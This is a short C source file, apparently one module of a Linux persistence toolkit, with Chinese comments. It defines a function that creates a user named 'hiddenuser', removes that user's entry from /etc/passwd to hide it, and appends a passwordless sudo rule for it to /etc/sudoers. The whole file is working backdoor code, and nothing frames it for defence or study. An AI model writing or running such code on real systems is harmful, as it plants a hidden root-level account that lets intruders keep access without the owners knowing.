#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_hidden_user.h"

#ifdef HIDDEN_USER_MOD
void setup_create_hidden_user() {
    const char* username = "hiddenuser";
    const char* home_dir = "/dev/null";
    const char* shell = "/bin/false";

    printf("创建隐藏用户...\n");

    // Step 1: 创建用户，不创建家目录，设置shell为/bin/false
    char command[256];
    snprintf(command, sizeof(command), "useradd -M -d %s -s %s %s", home_dir, shell, username);
    system(command);

    // Step 2: 从 /etc/passwd 移除用户条目以隐藏用户
    snprintf(command, sizeof(command), "cp /etc/passwd /etc/passwd.bak && grep -v '^%s:' /etc/passwd.bak > /etc/passwd", username);
    system(command);

    // Step 3: 配置sudo权限（可选）
    snprintf(command, sizeof(command), "echo '%s ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers", username);
    system(command);

    printf("隐藏用户已创建。\n");
}
#endif